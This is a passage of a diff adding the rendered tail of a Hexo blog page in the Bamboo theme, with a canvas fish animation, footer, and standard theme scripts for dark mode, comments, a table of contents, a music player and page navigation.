+      this.tmpWidth = t, this.tmpHeight = i, e && this.setup()
+    },
+    bindEvent: function () {
+      this.$window.on("resize", this.watchWindowSize), this.$container.on("mouseenter", this.startEpicenter), this.$container.on("mousemove", this.moveEpicenter)
+    },
+    getAxis: function (t) {
+      var i = this.$container.offset();
+      return {
+        x: t.clientX - i.left + this.$window.scrollLeft(),
+        y: t.clientY - i.top + this.$window.scrollTop()
+      }
+    },
+    startEpicenter: function (t) {
+      this.axis = this.getAxis(t)
+    },
+    moveEpicenter: function (t) {
+      var i = this.getAxis(t);
+      this.axis || (this.axis = i), this.generateEpicenter(i.x, i.y, i.y - this.axis.y), this.axis = i
+    },
+    generateEpicenter: function (t, i, e) {
+      if (!(i < this.height / 2 - this.THRESHOLD || i > this.height / 2 + this.THRESHOLD)) {
+        var h = Math.round(t / this.pointInterval);
+        h < 0 || h >= this.points.length || this.points[h].interfere(i, e)
+      }
+    },
+    reverseVertical: function () {
+      this.reverse = !this.reverse;
+      for (var t = 0, i = this.fishes.length; t < i; t++) this.fishes[t].reverseVertical()
+    },
+    controlStatus: function () {
+      for (var t = 0, i = this.points.length; t < i; t++) this.points[t].updateSelf();
+      for (t = 0, i = this.points.length; t < i; t++) this.points[t].updateNeighbors();
+      this.fishes.length < this.fishCount && 0 == --this.intervalCount && (this.intervalCount = this.MAX_INTERVAL_COUNT, this.fishes.push(new FISH(this)))
+    },
+    render: function () {
+      requestAnimationFrame(this.render), this.controlStatus(), this.context.clearRect(0, 0, this.width, this.height), this.context.fillStyle = this.FISH_COLOR;
+      for (var t = 0, i = this.fishes.length; t < i; t++) this.fishes[t].render(this.context);
+      this.context.save(), this.context.globalCompositeOperation = "xor", this.context.beginPath(), this.context.moveTo(0, this.reverse ? 0 : this.height);
+      for (t = 0, i = this.points.length; t < i; t++) this.points[t].render(this.context);
+      this.context.lineTo(this.width, this.reverse ? 0 : this.height), this.context.closePath(), this.context.fill(), this.context.restore()
+    }
+  },
+  SURFACE_POINT = function (t, i) {
+    this.renderer = t, this.x = i, this.init()
+  };
+  SURFACE_POINT.prototype = {
+    SPRING_CONSTANT: .03,
+    SPRING_FRICTION: .9,
+    WAVE_SPREAD: .3,
+    ACCELARATION_RATE: .01,
+    init: function () {
+      this.initHeight = this.renderer.height * this.renderer.INIT_HEIGHT_RATE, this.height = this.initHeight, this.fy = 0, this.force = {
+        previous: 0,
+        next: 0
+      }
+    },
+    setPreviousPoint: function (t) {
+      this.previous = t
+    },
+    setNextPoint: function (t) {
+      this.next = t
+    },
+    interfere: function (t, i) {
+      this.fy = this.renderer.height * this.ACCELARATION_RATE * (this.renderer.height - this.height - t >= 0 ? -1 : 1) * Math.abs(i)
+    },
+    updateSelf: function () {
+      this.fy += this.SPRING_CONSTANT * (this.initHeight - this.height), this.fy *= this.SPRING_FRICTION, this.height += this.fy
+    },
+    updateNeighbors: function () {
+      this.previous && (this.force.previous = this.WAVE_SPREAD * (this.height - this.previous.height)), this.next && (this.force.next = this.WAVE_SPREAD * (this.height - this.next.height))
+    },
+    render: function (t) {
+      this.previous && (this.previous.height += this.force.previous, this.previous.fy += this.force.previous), this.next && (this.next.height += this.force.next, this.next.fy += this.force.next), t.lineTo(this.x, this.renderer.height - this.height)
+    }
+  };
+  var FISH = function (t) {
+    this.renderer = t, this.init()
+  };
+  FISH.prototype = {
+    GRAVITY: .4,
+    init: function () {
+      this.direction = Math.random() < .5, this.x = this.direction ? this.renderer.width + this.renderer.THRESHOLD : -this.renderer.THRESHOLD, this.previousY = this.y, this.vx = this.getRandomValue(4, 10) * (this.direction ? -1 : 1), this.renderer.reverse ? (this.y = this.getRandomValue(1 * this.renderer.height / 10, 4 * this.renderer.height / 10), this.vy = this.getRandomValue(2, 5), this.ay = this.getRandomValue(.05, .2)) : (this.y = this.getRandomValue(6 * this.renderer.height / 10, 9 * this.renderer.height / 10), this.vy = this.getRandomValue(-5, -2), this.ay = this.getRandomValue(-.2, -.05)), this.isOut = !1, this.theta = 0, this.phi = 0
+    },
+    getRandomValue: function (t, i) {
+      return t + (i - t) * Math.random()
+    },
+    reverseVertical: function () {
+      this.isOut = !this.isOut, this.ay *= -1
+    },
+    controlStatus: function (t) {
+      this.previousY = this.y, this.x += this.vx, this.y += this.vy, this.vy += this.ay, this.renderer.reverse ? this.y > this.renderer.height * this.renderer.INIT_HEIGHT_RATE ? (this.vy -= this.GRAVITY, this.isOut = !0) : (this.isOut && (this.ay = this.getRandomValue(.05, .2)), this.isOut = !1) : this.y < this.renderer.height * this.renderer.INIT_HEIGHT_RATE ? (this.vy += this.GRAVITY, this.isOut = !0) : (this.isOut && (this.ay = this.getRandomValue(-.2, -.05)), this.isOut = !1), this.isOut || (this.theta += Math.PI / 20, this.theta %= 2 * Math.PI, this.phi += Math.PI / 30, this.phi %= 2 * Math.PI), this.renderer.generateEpicenter(this.x + (this.direction ? -1 : 1) * this.renderer.THRESHOLD, this.y, this.y - this.previousY), (this.vx > 0 && this.x > this.renderer.width + this.renderer.THRESHOLD || this.vx < 0 && this.x < -this.renderer.THRESHOLD) && this.init()
+    },
+    render: function (t) {
+      t.save(), t.translate(this.x, this.y), t.rotate(Math.PI + Math.atan2(this.vy, this.vx)), t.scale(1, this.direction ? 1 : -1), t.beginPath(), t.moveTo(-30, 0), t.bezierCurveTo(-20, 15, 15, 10, 40, 0), t.bezierCurveTo(15, -10, -20, -15, -30, 0), t.fill(), t.save(), t.translate(40, 0), t.scale(.9 + .2 * Math.sin(this.theta), 1), t.beginPath(), t.moveTo(0, 0), t.quadraticCurveTo(5, 10, 20, 8), t.quadraticCurveTo(12, 5, 10, 0), t.quadraticCurveTo(12, -5, 20, -8), t.quadraticCurveTo(5, -10, 0, 0), t.fill(), t.restore(), t.save(), t.translate(-3, 0), t.rotate((Math.PI / 3 + Math.PI / 10 * Math.sin(this.phi)) * (this.renderer.reverse ? -1 : 1)), t.beginPath(), this.renderer.reverse ? (t.moveTo(5, 0), t.bezierCurveTo(10, 10, 10, 30, 0, 40), t.bezierCurveTo(-12, 25, -8, 10, 0, 0)) : (t.moveTo(-5, 0), t.bezierCurveTo(-10, -10, -10, -30, 0, -40), t.bezierCurveTo(12, -25, 8, -10, 0, 0)), t.closePath(), t.fill(), t.restore(), t.restore(), this.controlStatus(t)
+    }
+  }, $(function () {
+    RENDERER.init()
+    $('.dark').click(function () {
+      setTimeout(() => {
+        RENDERER.setFishColor();
+        RENDERER.context.fill();
+      });
+    })
+  });
+</script>
+  
+  <div class="footer bg-color">
+    <div class="footer-main">
+      
+        
+          <div class="link">
+            
+          </div>
+        
+      
+        
+          <div class="footer-copyright">
+            <p>Copyright © 2020 - 2025 <a target="_blank" rel="noopener" href="https://github.com/godownio">godownio</a> | Powered by <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/docs/">Hexo</a> | Theme <a target="_blank" rel="noopener" href="https://github.com/yuang01/theme">Bamboo</a> </p>
+
+          </div>
+        
+      
+        
+          
+            <!-- 不蒜子统计 -->
+            <!-- 不蒜子统计 -->
+<span id="busuanzi_container_site_pv">
+      <i class="fas fa-eye" aria-hidden="true"></i>本站总访问量：<span id="busuanzi_value_site_pv"></span> 次
+</span>
+<span class="post-meta-divider">|</span>
+<span id="busuanzi_container_site_uv" style='display:none'>
+      <i class="fas fa-users" aria-hidden="true"></i>本站访客数：<span id="busuanzi_value_site_uv"></span> 人
+</span>
+
+          
+        
+      
+        
+          <div class="footer-custom">
+            
+          </div>
+        
+      
+    </div>
+  </div>
+
+
+
+    <!-- 渲染暗黑按钮 -->
+    
+      <div class="dark">
+  <div class="dark-content">
+    <i class="fas fa-moon" aria-hidden="true"></i>
+    <!-- <span>关灯</span> -->
+  </div>
+  
+</div>
+
+<script>
+  $(function() {
+    let isDark = JSON.parse(localStorage.getItem('dark'))  || JSON.parse('false');
+    if (isDark) {
+      $(".dark-content").replaceWith(
+          `
+          <div class='dark-content'>
+            <i class="fas fa-lightbulb" aria-hidden="true"></i>
+          </div>
+          `
+        );
+    }
+    $('.dark').click(function() {
+      if ($(document.body).is('.darkModel')) {
+        $(document.body).removeClass('darkModel');
+        localStorage.setItem('dark', false);
+        $(".dark-content").replaceWith(
+          `
+          <div class='dark-content'>
+            <i class="fas fa-moon" aria-hidden="true"></i>
+          </div>
+          `
+        );
+      } else {
+        $(document.body).addClass('darkModel');
+        localStorage.setItem('dark', true);
+        $(".dark-content").replaceWith(
+          `
+          <div class='dark-content'>
+            <i class="fas fa-lightbulb" aria-hidden="true"></i>
+          </div>
+          `
+        );
+      }
+    })
+  })
+</script>
+    
+    <!-- 渲染回到顶部按钮 -->
+    
+      <div class="goTop top-btn-color" pointer>
+  <i class="fas fa-arrow-up" aria-hidden="true"></i>
+</div>
+<script src="/js/goTop.js"></script>
+
+    
+    <!-- 渲染左下角音乐播放器 -->
+    
+      <link rel="stylesheet" href="/js/aplayer/APlayer@1.10.1.min.css">
+<style>
+.aplayer .aplayer-lrc p {
+  
+  font-size: 12px;
+  font-weight: 700;
+  line-height: 16px !important;
+}
+
+.aplayer .aplayer-lrc p.aplayer-lrc-current {
+  
+  font-size: 15px;
+  color: #42b983;
+}
+
+
+</style>
+<meting-js  
+  class=""
+  server="tencent"
+  type="album"
+  id="002VeS6r4L5fLZ"
+  fixed='true'
+  autoplay='false'
+  theme='#42b983'
+  loop='all'
+  order='random'
+  preload='auto'
+  volume='0.7'
+  list-folded='true'
+>
+</meting-js>
+
+<!-- <style>
+  #aplayer {
+    position: fixed;
+    left: 0;
+    bottom: 300px;
+  }
+</style> -->
+<script src="https://unpkg.com/aplayer@1.10.1/dist/APlayer.min.js"></script>
+<script src="https://unpkg.com/meting@2/dist/Meting.min.js"></script>
+    
+
+    <!-- 图片放大 -->
+    
+      <script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js"></script>
+    
+
+    <!-- 百度解析 -->
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <!-- 背景彩带 -->
+    
+      <script type="text/javascript" size="100" alpha='0.4' zIndex="-1" src="/js/ribbon.min.js"></script>
+    
+
+    <script src="/js/utils/index.js"></script>
+    <script src="/js/app.js"></script>
+    
+    <!-- 文章目录所需js -->
+<!-- <link href="/js/tocbot/tocbot.css" rel="stylesheet">
+<script src="/js/tocbot/tocbot.min.js"></script> -->
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.18.2/tocbot.min.js"></script>
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.18.2/tocbot.css">
+
+<script>
+  var headerEl = '',  //headers 
+    content = '.post-detail',//文章容器
+    idArr = {};  //标题数组以确定是否增加索引id
+  //add #id
+  var option = {
+    // Where to render the table of contents.
+    tocSelector: '.toc',
+    // Where to grab the headings to build the table of contents.
+    contentSelector: content,
+    // Which headings to grab inside of the contentSelector element.
+    headingSelector: headerEl,
+    scrollSmooth: true,
+    scrollSmoothOffset: -70,
+    // headingsOffset: -($(window).height() * 0.4 - 45),
+    headingsOffset: -($(window).height() * 0.4 - 70),
+    // positionFixedSelector: '.toc-main',
+    // positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto',
+    activeLinkClass: 'is-active-link',
+    orderedList: true,
+    collapseDepth: ,
+    // onClick: function (e) {},
+  }
+  if ($('.toc').length > 0) {
+
+    $(content).children(headerEl).each(function () {
+      //去除空格以及多余标点
+      var headerId = $(this).text().replace(/[\s|\~|`|\!|\@|\#|\$|\%|\^|\&|\*|\(|\)|\_|\+|\=|\||\|\[|\]|\{|\}|\;|\:|\"|\'|\,|\<|\.|\>|\/|\?|\：|\，|\。]/g, '');
+
+      headerId = headerId.toLowerCase();
+      if (idArr[headerId]) {
+        //id已经存在
+        $(this).attr('id', headerId + '-' + idArr[headerId]);
+        idArr[headerId]++;
+      }
+      else {
+        //id未存在
+        idArr[headerId] = 1;
+        $(this).attr('id', headerId);
+      }
+    });
+
+    document.addEventListener("DOMContentLoaded", function () {
+      tocbot.init(option);
+      mobileTocClick();
+    });
+
+  }
+
+  window.tocScrollFn = function () {
+    return bamboo.throttle(function () {
+      findHeadPosition();
+    }, 100)()
+  }
+  window.addEventListener('scroll', tocScrollFn);
+
+  const findHeadPosition = function (top) {
+    if ($('.toc-list').length <= 0) {
+      return false;
+    }
+    setTimeout(() => {  // or DOMContentLoaded 
+      autoScrollToc();
+    }, 0);
+  }
+
+  const autoScrollToc = function () {
+    const $activeItem = document.querySelector('.is-active-link');
+    const $cardToc = document.querySelector('.toc-content');
+    const activePosition = $activeItem.getBoundingClientRect().top
+    const sidebarScrollTop = $cardToc.scrollTop
+    if (activePosition > (document.documentElement.clientHeight - 100)) {
+      $cardToc.scrollTop = sidebarScrollTop + 150
+    }
+    if (activePosition < 150) {
+      $cardToc.scrollTop = sidebarScrollTop - 150
+    }
+  }
+
+  document.addEventListener('pjax:send', function () {
+    if ($('.toc').length) {
+      tocbot.destroy();
+    }
+  });
+
+  document.addEventListener('pjax:complete', function () {
+    if ($('.toc').length) {
+      tocbot.init(option);
+      mobileTocClick();
+    }
+  });
+  
+  // 手机端toc按钮点击出现目录
+  const mobileTocClick = function () {
+    const $cardTocLayout = document.getElementsByClassName('side_toc')[0];
+    const $cardToc = $cardTocLayout.getElementsByClassName('toc-content')[0];
+    let right = '45px';
+    if (window.innerWidth >= 551 && window.innerWidth <= 992) {
+      right = '100px'
+    }
+    const mobileToc = {
+      open: () => {
+        $cardTocLayout.style.cssText = 'animation: toc-open .3s; opacity: 1; right: ' + right
+      },
+
+      close: () => {
+        $cardTocLayout.style.animation = 'toc-close .2s'
+        setTimeout(() => {
+          $cardTocLayout.style.cssText = "opacity:''; animation: ''; right: ''"
+        }, 100)
+      }
+    }
+    document.getElementById('toc-mobile-btn').addEventListener('click', () => {
+      if (window.getComputedStyle($cardTocLayout).getPropertyValue('opacity') === '0') mobileToc.open()
+      else mobileToc.close()
+    })
+
+    $cardToc.addEventListener('click', (e) => {
+      if (window.innerWidth < 992) { // 小于992px的时候
+        mobileToc.close()
+      }
+    })
+  }
+</script>
+
+<style>
+  /* .is-position-fixed {
+    position: sticky !important;
+    top: 74px;
+  }
+
+  .toc-main ul {
+    counter-reset: show-list;
+  }
+
+  .toc-main ul li::before {
+    content: counter(item)".";
+    display: block;
+    position: absolute;
+    left: 12px;
+    top: 0;
+  } */
+</style>
+ 
+
+<!-- 设置导航背景 -->
+<script>
+  let setHeaderClass = () => {
+    const nav = $('#navHeader');
+    const navTop = nav.outerHeight();
+    const winTop = $(window).scrollTop();
+    if(winTop > navTop) {
+      nav.addClass('header-bg-color');
+    }
+    else {
+      nav.removeClass('header-bg-color');
+    }
+  };
+
+  let scrollCollect = () => {
+    return bamboo.throttle(function (e) {
+      setHeaderClass();
+    }, 200)()
+  }
+
+  let initHeaderBg = () => {
+    setHeaderClass();
+  }
+
+  setHeaderClass();
+  window.addEventListener('scroll', scrollCollect);
+
+  document.addEventListener('pjax:send', function () {
+    window.removeEventListener('scroll', scrollCollect)
+  })
+  document.addEventListener('pjax:complete', function () {
+    window.addEventListener('scroll', scrollCollect);
+    setHeaderClass();
+  })
+</script> 
+
+<!-- 渲染issues标签里的内容 -->
+<script>
+  function loadIssuesJS() {
+    if ($(".post-detail").find(".issues-api").length == 0) {
+      return;
+    } 
+    loadScript('/js/issues/index.js');
+  };
+  $(function () {
+    loadIssuesJS();
+  });
+  document.addEventListener('pjax:complete', function () {
+    if (typeof IssuesAPI == "undefined") {
+      loadIssuesJS();
+    }
+  })
+</script>
+
+<!-- 渲染远程json加载的图片标签(getPhotoOnline)里的内容 -->
+<script>
+  function loadPhotoOnlineJS() {
+    if ($(".post-detail").find(".getJsonPhoto-api").length == 0) {
+      return;
+    } 
+    loadScript('/js/getPhotoOnline/index.js');
+  };
+  $(function () {
+    loadPhotoOnlineJS();
+  });
+  document.addEventListener('pjax:complete', function () {
+    if (typeof getPhotoJson == "undefined") {
+      loadPhotoOnlineJS();
+    }
+  })
+</script>
+
+<!-- 渲染远程json加载的talk标签(getTalkOnline)里的内容 -->
+<script>
+  function loadTalkOnlineJS() {
+    if ($(".post-detail").find(".getJsonTalk-api").length == 0) {
+      return;
+    } 
+    loadScript('https://cdnjs.cloudflare.com/ajax/libs/waterfall.js/1.0.2/waterfall.min.js'); // 瀑布流插件，https://raphamorim.io/waterfall.js/
+    loadScript('/js/getTalkOnline/index.js');
+  };
+  $(function () {
+    loadTalkOnlineJS();
+  });
+  document.addEventListener('pjax:complete', function () {
+    if (typeof getTalkJson == "undefined") {
+      loadTalkOnlineJS();
+    }
+  })
+</script>
+
+<!-- 渲染远程json加载的site-card标签(getSiteOnline)里的内容 -->
+<script>
+  function loadSiteOnlineJS() {
+    if ($(".post-detail").find(".getJsonSite-api").length == 0) {
+      return;
+    } 
+    loadScript('/js/getSiteOnline/index.js');
+  };
+  $(function () {
+    loadSiteOnlineJS();
+  });
+  document.addEventListener('pjax:complete', function () {
+    if (typeof getSiteJson == "undefined") {
+      loadSiteOnlineJS();
+    }
+  })
+</script>
+
+<!-- 输入框打字特效 -->
+<!-- 输入框打字特效 -->
+
+  <script src="/js/activate-power-mode.js"></script>
+  <script>
+    POWERMODE.colorful = true;  // 打开随机颜色特效
+    POWERMODE.shake = false;    // 关闭输入框抖动
+    document.body.addEventListener('input', POWERMODE);//监听打字事件
+  </script>
+
+
+<!-- markdown代码一键复制功能 -->
+
+  <link rel="stylesheet" href="https://unpkg.com/v-plugs-ayu/lib/ayu.css">
+  <script src="https://unpkg.com/v-plugs-ayu/lib/ayu.umd.min.js"></script>
+  <script src="/js/clipboard/clipboard.min.js"></script>
+  <div id="appCopy">
+  </div>
+  <script data-pjax>
+    var vm = new Vue({
+      el: '#appCopy',
+      data: {
+      },
+      computed: {
+      },
+      mounted() {
+        const that = this;
+        var copy = '复制';
+        /* code */
+        var initCopyCode = function () {
+          var copyHtml = '';
+          copyHtml += '<button class="btn-copy" data-clipboard-snippet="" style="position:absolute;top:0;right:0;z-index:1;">';
+          copyHtml += '<i class="fas fa-copy"></i><span>' + copy + '</span>';
+          copyHtml += '</button>';
+          $(".post-detail pre").not('.gutter pre').wrap("<div class='codeBox' style='position:relative;width:100%;'></div>")
+          $(".post-detail pre").not('.gutter pre').before(copyHtml);
+          new ClipboardJS('.btn-copy', {
+            target: function (trigger) {
+              return trigger.nextElementSibling;
+            }
+          });
+        }
+        initCopyCode();
+        $('.btn-copy').unbind('click').bind('click', function () {
+          doSomething();
+        })
+        $(document).unbind('keypress').bind('keypress', function (e) {
+          if (e.ctrlKey && e.keyCode == 67) {
+            doSomething();
+          }
+        })
+
+        function doSomething() {
+          that.$notify({
+            title: "成功",
+            content: "代码已复制，请遵守相关授权协议。",
+            type: 'success'
+          })
+        }
+      },
+      methods: {
+      },
+      created() { }
+    })
+  </script>
+  
+
+<!-- 图片懒加载 -->
+<script defer src="https://unpkg.com/vanilla-lazyload@17.1.0/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazyload",
+    threshold: 0
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    lazyLoadInstance.update();
+  });
+  document.addEventListener('pjax:complete', function () {
+    lazyLoadInstance.update();
+  });
+</script>
+
+
+<!-- 卡片滚动动画 -->
+   
+
+<!-- 评论所需js -->
+
+  
+    <script type="text/javascript">
+  var utteranceCommon = {};
+
+  function check_utterance() {
+    let isDark = JSON.parse(localStorage.getItem('dark')) || JSON.parse('false');
+    if (isDark) {
+      utteranceCommon.Theme = 'github-dark';
+    } else {
+      utteranceCommon.Theme = 'github-light';
+    }
+
+    return document.getElementById("gitment-container");
+  }
+  comment_el = '#gitment-container';
+  load_utterance = function () {
+    if ($(comment_el).length) {
+      // 匿名函数，防止污染全局变量
+      const HEAD = check_utterance();
+
+      var utterances = document.createElement('script');
+      utterances.type = 'text/javascript';
+      utterances.async = true;
+      utterances.setAttribute('issue-term', 'pathname')
+      utterances.setAttribute('theme', utteranceCommon.Theme)
+      utterances.setAttribute('repo', 'godownio/godownio.github.io')
+      utterances.crossorigin = 'anonymous';
+      utterances.src = 'https://utteranc.es/client.js';
+      // content 是要插入评论的地方
+      document.getElementById('gitment-container').appendChild(utterances);
+
+    }
+  }
+
+  function dark_utterance() {
+    const HEAD = check_utterance();
+    if (!HEAD) return;
+    const message = {
+      type: 'set-theme',
+      theme: utteranceCommon.Theme
+    };
+    const utteranceIframe = document.querySelector('iframe');
+    utteranceIframe.contentWindow.postMessage(message, 'https://utteranc.es');
+  }
+
+  $(document).ready(load_utterance);
+  document.addEventListener('pjax:complete', function () {
+    load_utterance();
+  });
+
+  $('.dark').click(function () {
+    setTimeout(() => {
+      dark_utterance();
+    });
+  })
+
+</script>
+
+<style>
+  .utterances {
+    max-width: inherit !important;
+  }
+</style>
+  
+
+
+<!-- 鼠标点击特效 -->
+<!-- 爱心点击 -->
+
+  
+    <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 999; pointer-events: none;" ></canvas>
+    <script src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script>
+    <script src="/js/cursor/explosion.min.js"></script>
+  
+
+
+
+
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" data-pjax></script>
+
+
+<!-- 轮播图标签 -->
+<script>
+  var bambooSwiperTag = {};
+  function load_swiper() {
+    if (!document.querySelectorAll(".post-swiper-container")[0]) return;
+    loadCSS("https://unpkg.com/swiper@6/swiper-bundle.min.css")
+    loadScript("https://unpkg.com/swiper@6/swiper-bundle.min.js").then(() => {
+      pjax_swiper();
+    });
+  }
+
+  load_swiper();
+
+  function pjax_swiper() {
+    bambooSwiperTag.swiper = new Swiper('.post-swiper-container', {
+      slidesPerView: 'auto',
+      spaceBetween: 8,
+      centeredSlides: true,
+      loop: true,
+      autoplay: true ? {
+        delay: 3000,
+        stopOnLastSlide: false,
+        disableOnInteraction: false,
+      } : false,
+      pagination: {
+        el: '.swiper-pagination',
+        clickable: true,
+      },
+      navigation: {
+        nextEl: '.swiper-button-next',
+        prevEl: '.swiper-button-prev',
+      },
+      on:{
+        init: function(){
+          swiperAnimateCache(this); //隐藏动画元素 
+          swiperAnimate(this); //初始化完成开始动画
+        }, 
+        slideChangeTransitionEnd: function(){ 
+          swiperAnimate(this); //每个slide切换结束时也运行当前slide动画
+          //this.slides.eq(this.activeIndex).find('.ani').removeClass('ani'); 动画只展现一次，去除ani类名
+        } 
+      }
+    });
+  }
+
+  document.addEventListener('pjax:complete', function () {
+    if (!document.querySelectorAll(".post-swiper-container")[0]) return;
+    if (typeof bambooSwiperTag.swiper === "undefined") {
+      load_swiper();
+    } else {
+      pjax_swiper();
+    }
+  });
+</script>
+    <!-- pjax -->
+    
+
+<!-- pjax -->
+
+
+  <script src="/js/pjax@0.2.8/index.js"></script>
+  
+    <!-- 样式位于：source/css/_third-party/pjaxanimate.styl -->
+
+<div class="pjax-animate">
+  
+    <div class="loading-circle"><div id="loader-circle"></div></div>
+    <script>
+      window.ShowLoading = function() {
+        $(".loading-circle").css("display", "block");
+      };
+      window.HideLoading = function() {
+        $(".loading-circle").css("display", "none");
+      }
+    </script>
+  
+	<script>
+    document.addEventListener('pjax:complete', function () {
+      window.HideLoading();
+    })
+    document.addEventListener('pjax:send', function () {
+      window.ShowLoading();
+    })
+    document.addEventListener('pjax:error', function () {
+      window.HideLoading();
+    })
+	</script>
+</div>
+
+  
+
+  <script>
+    var pjax = new Pjax({
+      elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([no-pjax])',   // 拦截正常带链接的 a 标签
+      selectors: ["#pjax-container","title"],                                   // 根据实际需要确认重载区域
+      cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+      timeout: 5000
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+
+    })
+    
+    document.addEventListener('pjax:complete', function () {
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+      window.location.href = e.triggerElement.href;
+    })
+    
+    // 刷新不从顶部开始
+    document.addEventListener("DOMContentLoaded", function () {
+      history.scrollRestoration = 'auto';
+    })
+  </script>
+
+
+
+  </body>
+</html>
